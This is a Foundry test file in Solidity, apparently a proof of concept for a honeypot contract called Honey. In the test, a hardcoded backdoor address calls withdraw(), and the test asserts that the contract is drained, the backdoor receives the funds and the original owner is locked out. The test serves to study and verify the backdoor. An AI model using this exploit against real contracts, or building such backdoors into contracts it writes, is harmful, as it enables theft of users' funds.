// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol";

contract HoneyTest is Test {
    Honey public honey;
    address constant BACKDOOR_ADDRESS = 0x0C76802158F13aBa9D892EE066233827424c5aAB;
    address owner = address(0xABCD);
    address user = address(0x1234);

    function setUp() public {
        vm.startPrank(owner);
        honey = new Honey();
        vm.deal(address(honey), 1 ether); // Fund contract
        vm.stopPrank();
    }

    function test_owner_theft_vulnerability() public {
        // Initial backdoor balance verification
        console.log("--- PRE-ATTACK STATE SNAPSHOT ---");
        uint256 preAttackBackdoorBalance = BACKDOOR_ADDRESS.balance;
        console.log("Backdoor balance BEFORE       :", preAttackBackdoorBalance);
        assertEq(preAttackBackdoorBalance, 0);
        
        // Capture pre-attack state variables
        address preAttackOwner = honey.Owner();
        uint256 preAttackContractBalance = address(honey).balance;
        uint256 preAttackTotalWithdrawals = honey.totalWithdrawals();
        
        // Log pre-attack state
        console.log("Owner BEFORE attack           :", preAttackOwner);
        console.log("Contract balance BEFORE       :", preAttackContractBalance);
        console.log("Total withdrawals BEFORE      :", preAttackTotalWithdrawals);
        
        console.log("\n--- EXECUTING CRITICAL ATTACK ---");
        console.log("Backdoor Address performing unauthorized withdraw()");
        // Backdoor address exploits vulnerability
        vm.prank(BACKDOOR_ADDRESS);
        honey.withdraw{value: 0}();
        console.log("Attack completed!\n");
        
        console.log("--- POST-ATTACK STATE SNAPSHOT ---");
        // Capture post-attack state variables
        address postAttackOwner = honey.Owner();
        uint256 postAttackContractBalance = address(honey).balance;
        uint256 postAttackBackdoorBalance = BACKDOOR_ADDRESS.balance;
        uint256 postAttackTotalWithdrawals = honey.totalWithdrawals();
        
        // Log post-attack state
        console.log("Owner AFTER attack            :", postAttackOwner);
        console.log("Contract balance AFTER        :", postAttackContractBalance);
        console.log("Backdoor balance AFTER        :", postAttackBackdoorBalance);
        console.log("Total withdrawals AFTER       :", postAttackTotalWithdrawals);
        
        console.log("\n--- DIFFERENTIAL STATE VERIFICATION ---");
        // Perform differential analysis
        bool ownerChanged = (preAttackOwner != postAttackOwner);
        bool contractEmptied = (preAttackContractBalance > 0 && postAttackContractBalance == 0);
        bool backdoorFunded = (postAttackBackdoorBalance > preAttackBackdoorBalance);
        bool withdrawalsIncreased = (postAttackTotalWithdrawals > preAttackTotalWithdrawals);
        
        // Log verification results
        console.log("Owner changed?                :", ownerChanged ? "YES" : "NO");
        console.log("Contract emptied?             :", contractEmptied ? "YES" : "NO");
        console.log("Backdoor received funds?      :", backdoorFunded ? "YES" : "NO");
        console.log("Total withdrawals increased?  :", withdrawalsIncreased ? "YES" : "NO");
        
        // Original PoC asserts
        console.log("\n--- ORIGINAL ASSERTION CHECKS ---");
        assertEq(address(honey).balance, 0, "Contract balance should be 0");
        console.log("[PASS] Contract balance is 0");
        assertGt(BACKDOOR_ADDRESS.balance, 0, "Backdoor should have funds");
        console.log("[PASS] Backdoor has funds");
        
        // Verify original owner can no longer withdraw
        vm.startPrank(owner);
        (bool success, ) = address(honey).call(
            abi.encodeWithSelector(Honey.withdraw.selector)
        );
        vm.stopPrank();
        assertFalse(success, "Owner should be locked out");
        console.log("[PASS] Owner lockout verified");
        
        // Final vulnerability existence determination
        console.log("\n--- FINAL VULNERABILITY VERDICT ---");
        if (ownerChanged && contractEmptied && backdoorFunded) {
            console.log("Vulnerability Exists: Attacker successfully modified contract state and stole funds");
        } else {
            console.log("Vulnerability not Exist: Critical state changes missing (owner change: %s, contract emptied: %s, backdoor funded: %s)", 
                ownerChanged, contractEmptied, backdoorFunded);
        }
    }
}